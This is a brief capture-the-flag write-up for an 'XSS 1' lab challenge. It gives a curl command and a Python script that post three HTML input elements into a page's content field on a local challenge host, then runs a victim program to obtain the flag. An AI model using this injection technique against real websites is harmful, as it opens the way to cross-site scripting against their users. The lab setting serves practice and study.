# XSS 1

#### Pretty straight forward, craft a POST request with 3 text boxes:

```curl -d "content= <input type=\"text\"><input type=\"text\"><input type=\"text\">"```

----------------------------------------

#### Then call the victim

```/challenge/victim```

-----------------------------------------

#### Or the Python script

```python
import requests
import subprocess

url = "http://challenge.localhost/"
data = {
    "content": "<input type=\"text\"><input type=\"text\"><input type=\"text\">"
}

req = requests.post(url=url, data=data)
flag = subprocess.run('/challenge/victim')
```
